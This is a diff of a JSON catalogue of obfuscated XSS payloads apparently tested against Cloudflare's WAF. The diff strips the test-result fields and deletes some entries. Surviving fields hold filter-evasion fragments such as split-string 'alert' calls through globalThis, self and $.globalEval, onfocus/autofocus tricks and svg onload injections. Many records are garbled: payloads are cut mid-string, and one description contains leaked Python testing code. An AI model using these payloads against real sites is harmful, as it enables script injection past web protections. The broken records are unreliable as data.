@@ -991,25 +371,7 @@
       "description": "onfinish",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0072",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus",
-      "description": "onchange",
-      "technique": "direct_injection",
-      "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0073",
@@ -1019,11 +381,7 @@
       "description": "onclick",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0074",
@@ -1033,67 +391,7 @@
       "description": "onpointerenter",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0075",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus",
-      "description": "onmouseover', 'onpointerenter",
-      "technique": "direct_injection",
-      "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0076",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus",
-      "description": "onclick",
-      "technique": "direct_injection",
-      "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0077",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "ale\"+\"rt\"](1)>",
-      "description": "bracket-globalThis\": '<svg onload=globalThis[\"ale\"+\"rt",
-      "technique": "direct_injection",
-      "source_file": "waf_round16.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0078",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onfocus=",
-      "description": "onclick=\", \"onmouseover=\", \"alert(\", \"confirm(\", \"prompt(",
-      "technique": "direct_injection",
-      "source_file": "waf_round4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0079",
@@ -1103,39 +401,7 @@
       "description": "attr-onclick-prompt\": '\"onclick=prompt(8)>\"@x.y',\n    \"attr-onclick-svg\": '\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y',\n    # With fragment\n    \"attr-onfocus-frag\": 'bbbbb\" Only=1 tabindex=1 onfocus=alert(1) id=\"bbbbb',\n}\n\nfor name, payload in known_attr.items():\n    b, r, p = test(name, \"attributeHtml\", payload)\n    if r: bypasses.append((\"ATTR\", name, payload))\n    elif p: partials.append((\"ATTR\", name, payload))\n\n# Also test POST method for attribute\nprint(\"\\n  --- POST method for attribute context ---\\n",
       "technique": "direct_injection",
       "source_file": "waf_round4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0080",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "al\"+\"ert\"](1)>",
-      "description": "svg-oni-selfAlert\": '<svg/oni=on onload=self[\"alert",
-      "technique": "direct_injection",
-      "source_file": "waf_round4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0081",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "onload",
-      "description": "onerror', 'onfocus",
-      "technique": "direct_injection",
-      "source_file": "waf_round69_mass2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0082",
@@ -1145,11 +411,7 @@
       "description": "<svg onload\\\\r\\\\n=$.globalEval(\"al\"+\"ert()",
       "technique": "direct_injection",
       "source_file": "waf_round75_cross_waf.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0083",
@@ -1159,11 +421,7 @@
       "description": "import",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0084",
@@ -1173,11 +431,7 @@
       "description": "innerText",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0085",
@@ -1187,11 +441,7 @@
       "description": "x",
       "technique": "direct_injection",
       "source_file": "waf_round67_value_brute.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0086",
@@ -1201,11 +451,7 @@
       "description": "real-onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0087",
@@ -1215,11 +461,7 @@
       "description": "real-onclick",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0088",
@@ -1229,11 +471,7 @@
       "description": "vt-onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-obf-0089",
@@ -1243,39 +481,7 @@
       "description": "ff-onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0090",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "<details open ontoggle=",
-      "description": ">",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-obf-0091",
-      "category": "xss",
-      "subcategory": "obfuscated",
-      "payload": "<input onfocus=",
-      "description": " autofocus>",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     }
   ]
 }
